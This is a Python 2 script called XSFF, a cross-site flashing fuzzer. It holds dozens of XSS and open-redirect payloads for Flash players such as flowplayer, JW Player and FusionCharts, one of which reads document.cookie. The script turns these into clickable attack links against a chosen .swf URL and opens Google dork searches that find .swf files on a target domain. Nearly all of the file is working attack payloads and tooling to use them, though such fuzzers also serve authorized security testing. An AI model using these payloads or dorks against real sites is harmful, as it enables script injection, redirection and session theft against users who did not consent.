#!usr/bin/python

import sys
import webbrowser

END = "\033[0m"
blue = "\033[0;34m"
red = "\033[1;91m"


payloads_mp3 = ['?imageURL=javascript:alert(/XSFF/)','?imageURL=\" onerror=prompt(/XSFF/)','?base=http://seguridadblanca.in','?base=javascript:alert(/XSFF/)','?URL=http://seguridadblanca.in','?URL=javascript:alert(/XSFF/)','?url=http://seguridadblanca.in','?url=javascript:alert(/XSSF/)']

payloads_video = ['?url=http://stream.flowplayer.org/bauhaus/624x260.mp4&callback=confirm%28%2FXSFF%2F%29&.swf','?config={%22clip%22:{%22url%22:%22http://stream.flowplayer.org/bauhaus/624x260.mp4%22,%20%22linkUrl%22:%22javascript:confirm%28%2FXSFF%2F%29;%22}}&.swf','?config={playList:%20[{%20url:%20%22http://stream.flowplayer.org/bauhaus/624x260.mp4%22,%20linkUrl:%20%22javascript:confirm%28%2FXSFF%2F%29%22}]}&.swf','?skinName=asfunction:getURL,javascript:alert(1337)//','?debug=alert(/XSFF/)','?flv=http://flv-player.net/medias/KyodaiNoGilga.flv&startimage=http://2.bp.blogspot.com/_IhM_rPvn0ac/SZY93X6cDXI/AAAAAAAAAAM/aKiVZeLIbRI/S220/Imagen2009sobreNegro.png&onclicktarget=_self&onclick=javascript:confirm(/XSFF/);&ondoubleclick=http://www.tumitool.com&.swf','?file=http://content.bitsontherun.com/videos/bkaovAYt-364766.flv&autostart=false&image=http://2.bp.blogspot.com/_IhM_rPvn0ac/SZY93X6cDXI/AAAAAAAAAAM/aKiVZeLIbRI/S220/Imagen2009sobreNegro.png&displayclick=link&link=javajavascript:script:confirm(/XSFF/);//&linktarget=_self&.swf','?jQuery=confirm&id=XSFF%27)*confirm(document.cookie%2b\'&vol=0.8&muted=false&.swf','?readyFunction=confirm(/XSFF/)&.swf']

payloads_richmedia = ['?id=0\%22))}catch(e){alert(1337)}//','?onend=javascript:alert(1337)//','?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(/XSFF/);//','?baseurl=asfunction:getURL,javascript:alert(1337)//','?uri=http://seguridadblanca.in','?uri=javascript:alert(/XSFF/)','?mode=tags&tagcloud=%3Ctags%3E%3Ca%20href=%22javascript:confirm%28XSFF%29%22%20rel=%22tag%22%20style=%22font-size:16pt;%22%3EXSS!%20~%20Click%20Me%3C/a%3E%3Ca%20href=%22http://www.tumitool.com%22%20rel=%22tag%22%20style=%22font-size:16pt;%22%3EURL%20Redirection%3C/a%3E%3C/tags%3E&.swf','?dataXML=%3Cchart%20lineColor%3D%5C%27FF0000%5C%27%20clickURL%3D%5C%22javascript%3Aconfirm%28%2fXSFF%2f%29%5C%22%20caption%3D%5C%27Fusion%20Charts%20-%20Line%5C%27%20subcaption%3D%5C%22Vulnerability%20Proof%20of%20Concept%5C%22%20showValues%3D%5C%271%5C%27%20showLabels%3D%5C%271%5C%27%20showLegend%3D%5C%271%5C%27%3E%3Ccategories%3E%3Ccategory%20label%3D%5C%27Jan%5C%27%20%2f%3E%3Ccategory%20label%3D%5C%27Feb%5C%27%20%2f%3E%3Ccategory%20label%3D%5C%27Mar%5C%27%20%2f%3E%3C%2fcategories%3E%3Cset%20value%3D%5C%271%5C%27%2f%3E%3Cset%20value%3D%5C%271337%5C%27%20link%3D%5C%22javascript%3Aconfirm%28%2fXSFF%2f%29%5C%22%2f%3E%3Cset%20value%3D%5C%271%5C%27%20%2f%3E%3C%2fchart%3E&.swf','?buttonText=TumiTool%3Ca%20href%3D%22javascript%3Aconfirm%28%2fXSFF%2f%29%22%3ETest%3C%2fa%3E&.swf','?id=\"))}catch(e){confirm(/XSFF/);}//&width=500&height=500&.swf']

payloads_misc = ['?buyNowUrl=javacript:alert(/XSFF/)','?page=javascript:alert(/XSFF/)','?callback=http://seguridadblanca.in','?callback=javascript:alert(/XSFF/)','?URI=http://seguridadblanca.in','?URI=javascript:alert(/XSFF/)','#javascript:alert(/XSFF/)','#http://seguridadblanca.in','#getURL(javascript:alert(/XSFF/))','#getURL(http://seguridadblanca.in)','#getURL,javascript:alert(/XSFF/)','#getURL,http://seguridadblanca.in','?javascript:alert(/XSFF/)','?http://seguridadblanca.in','?getURL(javascript:alert(/XSFF/))','?getURL(http://seguridadblanca.in)','?getURL,javascript:alert(/XSFF/)','?getURL,http://seguridadblanca.in','?clickTAG=javascript:alert(/XSFF/)','?clickTag=javascript:alert(/XSFF/)','?clickTag=http://seguridadblanca.in','?clickTAG=http://seguridadblanca.in']

payloads_all = ['?imageURL=javascript:alert(/XSFF/)','?imageURL=\" onerror=prompt(/XSFF/)','?base=http://seguridadblanca.in','?base=javascript:alert(/XSFF/)','?URL=http://seguridadblanca.in','?URL=javascript:alert(/XSFF/)','?url=http://seguridadblanca.in','?url=javascript:alert(/XSSF/)','?url=http://stream.flowplayer.org/bauhaus/624x260.mp4&callback=confirm%28%2FXSFF%2F%29&.swf','?config={%22clip%22:{%22url%22:%22http://stream.flowplayer.org/bauhaus/624x260.mp4%22,%20%22linkUrl%22:%22javascript:confirm%28%2FXSFF%2F%29;%22}}&.swf','?config={playList:%20[{%20url:%20%22http://stream.flowplayer.org/bauhaus/624x260.mp4%22,%20linkUrl:%20%22javascript:confirm%28%2FXSFF%2F%29%22}]}&.swf','?skinName=asfunction:getURL,javascript:alert(1337)//','?debug=alert(/XSFF/)','?flv=http://flv-player.net/medias/KyodaiNoGilga.flv&startimage=http://2.bp.blogspot.com/_IhM_rPvn0ac/SZY93X6cDXI/AAAAAAAAAAM/aKiVZeLIbRI/S220/Imagen2009sobreNegro.png&onclicktarget=_self&onclick=javascript:confirm(/XSFF/);&ondoubleclick=http://www.tumitool.com&.swf','?file=http://content.bitsontherun.com/videos/bkaovAYt-364766.flv&autostart=false&image=http://2.bp.blogspot.com/_IhM_rPvn0ac/SZY93X6cDXI/AAAAAAAAAAM/aKiVZeLIbRI/S220/Imagen2009sobreNegro.png&displayclick=link&link=javajavascript:script:confirm(/XSFF/);//&linktarget=_self&.swf','?jQuery=confirm&id=XSFF%27)*confirm(document.cookie%2b\'&vol=0.8&muted=false&.swf','?readyFunction=confirm(/XSFF/)&.swf','?id=0\%22))}catch(e){alert(1337)}//','?onend=javascript:alert(1337)//','?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(/XSFF/);//','?baseurl=asfunction:getURL,javascript:alert(1337)//','?uri=http://seguridadblanca.in','?uri=javascript:alert(/XSFF/)','?mode=tags&tagcloud=%3Ctags%3E%3Ca%20href=%22javascript:confirm%28XSFF%29%22%20rel=%22tag%22%20style=%22font-size:16pt;%22%3EXSS!%20~%20Click%20Me%3C/a%3E%3Ca%20href=%22http://www.tumitool.com%22%20rel=%22tag%22%20style=%22font-size:16pt;%22%3EURL%20Redirection%3C/a%3E%3C/tags%3E&.swf','?dataXML=%3Cchart%20lineColor%3D%5C%27FF0000%5C%27%20clickURL%3D%5C%22javascript%3Aconfirm%28%2fXSFF%2f%29%5C%22%20caption%3D%5C%27Fusion%20Charts%20-%20Line%5C%27%20subcaption%3D%5C%22Vulnerability%20Proof%20of%20Concept%5C%22%20showValues%3D%5C%271%5C%27%20showLabels%3D%5C%271%5C%27%20showLegend%3D%5C%271%5C%27%3E%3Ccategories%3E%3Ccategory%20label%3D%5C%27Jan%5C%27%20%2f%3E%3Ccategory%20label%3D%5C%27Feb%5C%27%20%2f%3E%3Ccategory%20label%3D%5C%27Mar%5C%27%20%2f%3E%3C%2fcategories%3E%3Cset%20value%3D%5C%271%5C%27%2f%3E%3Cset%20value%3D%5C%271337%5C%27%20link%3D%5C%22javascript%3Aconfirm%28%2fXSFF%2f%29%5C%22%2f%3E%3Cset%20value%3D%5C%271%5C%27%20%2f%3E%3C%2fchart%3E&.swf','?buttonText=TumiTool%3Ca%20href%3D%22javascript%3Aconfirm%28%2fXSFF%2f%29%22%3ETest%3C%2fa%3E&.swf','?id=\"))}catch(e){confirm(/XSFF/);}//&width=500&height=500&.swf','?buyNowUrl=javacript:alert(/XSFF/)','?page=javascript:alert(/XSFF/)','?callback=http://seguridadblanca.in','?callback=javascript:alert(/XSFF/)','?URI=http://seguridadblanca.in','?URI=javascript:alert(/XSFF/)','#javascript:alert(/XSFF/)','#http://seguridadblanca.in','#getURL(javascript:alert(/XSFF/))','#getURL(http://seguridadblanca.in)','#getURL,javascript:alert(/XSFF/)','#getURL,http://seguridadblanca.in','?javascript:alert(/XSFF/)','?http://seguridadblanca.in','?getURL(javascript:alert(/XSFF/))','?getURL(http://seguridadblanca.in)','?getURL,javascript:alert(/XSFF/)','?getURL,http://seguridadblanca.in','?clickTAG=javascript:alert(/XSFF/)','?clickTag=javascript:alert(/XSFF/)','?clickTag=http://seguridadblanca.in','?clickTAG=http://seguridadblanca.in']


def helpyeah():
	print "__ __ __  ___  ___" 
	print "\ V // _|| __|| __|"
	print " ) ( \_ \| _| | _| " 
	print "/_n_\|__/|_|  |_| \n"
	print red + "Hi bro/sis :) Usage is: " + sys.argv[0] + " Option \n \n"
	print "Print Options:\n"
	print "dorksite - This Option will search for .swf files in the domain"
	print "flashsite - Will Fuzz for XSF" + END 



def checkoption():

	if sys.argv[1].lower() == "dorksite":
		dorksite()
	elif sys.argv[1].lower() == "flashsite":
		xsfyeah()
	else:
		helpyeah()


def xsfyeah():
	uri = raw_input("Input the URL: Ex. http://seguridadblanca.in/vuln.swf\n")
	option = raw_input("Type your Option:\n1.- Mp3 2.- Video 3.- Richmedia 4.- Misc 5.- All\n") 
	fout = open("xsff.html", "w")	
	fout.write("<center><h1>Cros Site Flashing Fuzzer</h1> By <a href=\"http://twitter.com/seguridadblanca\">Dedalo</a></center><br />")
	if option == "1":	
		for url in payloads_mp3:
			op = "<a href=\"" + uri + url +"\">" + url + "</a><br />" 
			fout.write(op)
	if option == "2":
		for url in payloads_video:
			op = "<a href=\"" + uri + url +"\">" + url + "</a><br />" 
			fout.write(op)
	if option == "3":
		for url in payloads_richmedia:
			op = "<a href=\"" + uri + url +"\">" + url + "</a><br />" 
			fout.write(op)
	if option == "4":
		for url in payloads_misc:
			op = "<a href=\"" + uri + url +"\">" + url + "</a><br />" 
			fout.write(op)
	if option == "5":
		for url in payloads_all:
			op = "<a href=\"" + uri + url +"\">" + url + "</a><br />" 
			fout.write(op)

	print blue + "Check xsff.html for clicking fuzz!!"
	print "Thanks for using XSFF"
	print ""
	print "__ __ __  ___  ___" 
	print "\ V // _|| __|| __|"
	print " ) ( \_ \| _| | _| " 
	print "/_n_\|__/|_|  |_| " + END
		

def dorksite():

	domain = raw_input("Input the domain: Ex. seguridadblanca.in\n")
	d1 = "site:" + domain + " filetype:swf"
	d2 = "site:" + domain + " inurl:player.swf"
	webbrowser.open_new_tab('https://www.google.com.pe/search?q=' + d1)
	webbrowser.open_new_tab('https://www.google.com.pe/search?q=' + d2)
	

if len(sys.argv) < 2:
	helpyeah()
else:
	checkoption()
